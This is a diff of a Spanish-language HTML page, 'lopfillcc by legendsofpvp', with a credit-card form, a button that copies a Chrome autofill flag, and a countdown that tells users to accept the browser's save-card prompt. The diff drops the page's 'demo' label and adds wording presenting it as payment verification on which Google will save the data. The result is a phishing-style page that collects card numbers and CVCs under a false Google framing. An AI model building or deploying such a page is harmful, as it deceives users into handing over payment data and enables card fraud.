@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
   <title>lopfillcc by legendsofpvp</title>
   <meta name="color-scheme" content="dark light">
-  <link rel="stylesheet" href="styles.css" />
+  <link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
   <canvas id="pixelRain" aria-hidden="true"></canvas>
 
@@ -21,14 +20,11 @@
         <div>
           <div class="autofillMini">
             <div class="autofillTitle">Enable autofill credit card</div>
-
             <div class="autofillLink" id="flagText" title="chrome://flags/#enable-autofill-credit-card-upload">
               chrome://flags/#enable-autofill-credit-card-upload
             </div>
-
             <button class="btnMini" type="button" id="copyFlag">Copy</button>
           </div>
-
           <div class="copyToast" id="flagHelp"></div>
 
           <div class="card">
@@ -36,9 +32,7 @@
               <div class="chip"></div>
               <div class="brand" id="brand">CARD</div>
             </div>
-
             <div class="number" id="displayNumber">#### #### #### ####</div>
-
             <div class="bottom">
               <div>
                 <div class="label">HOLDER</div>
@@ -54,79 +48,66 @@
 
         <div class="formPanel">
           <h1>lopfillcc <span>by legendsofpvp</span></h1>
-          <div class="sub">Demo de autofill para asociar método de pago</div>
+          <div class="sub">Asocia tu método de pago para verificación</div>
 
-          <form id="payment-form" action="" method="POST" autocomplete="on">
+          <form id="payment-form" name="checkout" method="POST" autocomplete="on">
             
             <div class="label2">Titular de la tarjeta</div>
-            <input
-              type="text"
-              id="cardHolder"
-              name="cc-name"
-              autocomplete="cc-name"
-              placeholder="Nombre como aparece en la tarjeta"
+            <input 
+              type="text" 
+              id="cardHolder" 
+              name="ccname" 
+              autocomplete="cc-name" 
+              placeholder="NOMBRE COMO APARECE" 
               required
-            />
+            >
 
             <div class="label2">Tarjeta / Card number 💳</div>
-            <input
-              type="tel"
-              id="cardNumber"
-              name="cardnumber"
-              autocomplete="cc-number"
-              inputmode="numeric"
-              placeholder="0000 0000 0000 0000"
-              maxlength="23"
+            <input 
+              type="tel" 
+              id="cardNumber" 
+              name="cardnumber" 
+              autocomplete="cc-number" 
+              inputmode="numeric" 
+              placeholder="0000 0000 0000 0000" 
+              maxlength="19" 
               required
-            />
+            >
 
             <div style="display: flex; gap: 10px;">
-              <div style="flex: 1;">
+              <div style="flex: 1.5;">
                 <div class="label2">Vencimiento</div>
-                <input
-                  type="tel"
-                  id="cardDate"
-                  name="cc-exp"
-                  autocomplete="cc-exp"
-                  inputmode="numeric"
-                  placeholder="MM/AA"
-                  maxlength="7"
+                <input 
+                  type="tel" 
+                  id="cardDate" 
+                  name="ccexp" 
+                  autocomplete="cc-exp" 
+                  placeholder="MM/AA" 
+                  maxlength="5" 
                   required
-                />
+                >
               </div>
               <div style="flex: 1;">
-                <div class="label2">CVV 🔒</div>
-                <input
-                  type="password"
-                  id="cardCvv"
-                  name="cvc"
-                  autocomplete="cc-csc"
-                  inputmode="numeric"
-                  placeholder="•••"
-                  maxlength="4"
+                <div class="label2">CVC (CVV) 🔒</div>
+                <input 
+                  type="password" 
+                  id="cardCvv" 
+                  name="cvc" 
+                  autocomplete="cc-csc" 
+                  inputmode="numeric" 
+                  placeholder="•••" 
+                  maxlength="4" 
                   required
-                />
+                >
               </div>
             </div>
 
-            <button type="submit">⚡ [ VINCULAR CUENTA ]</button>
+            <button type="submit" id="submit-btn">⚡ [ VINCULAR CUENTA ]</button>
             <div class="error" id="err"></div>
           </form>
 
-          <div class="actions">
-            <button type="button" class="actionBtn" id="update-button">
-              Actualizar dirección / checkout
-              <span class="hint">Boton debajo de AddCart</span>
-            </button>
-
-            <button type="button" class="actionBtn outline" id="perfil-button">
-              Conf perfil GPay
-              <span class="hint">Perfil / Payments</span>
-            </button>
-          </div>
-
-          <div class="note">
-            Nota: se abrirán páginas externas en una pestaña nueva.
+          <div class="note" style="margin-top: 15px;">
+            Nota: Al continuar, confirmas que Google puede guardar estos datos.
           </div>
         </div>
       </div>
@@ -135,9 +116,9 @@
 
   <div id="loading" role="dialog" aria-modal="true" aria-label="Procesando">
     <div class="loadingTitle">[ VERIFYING PAYMENT DATA ]</div>
-    <div class="counter" id="counter">5</div>
+    <div class="counter" id="counter">6</div>
     <div class="loadingSub">
-      Acepta el mensaje emergente de "Guardar tarjeta" si Chrome te lo solicita durante este conteo.
+      Si el navegador te solicita guardar la tarjeta para futuros pagos, presiona "Guardar".
     </div>
   </div>
 
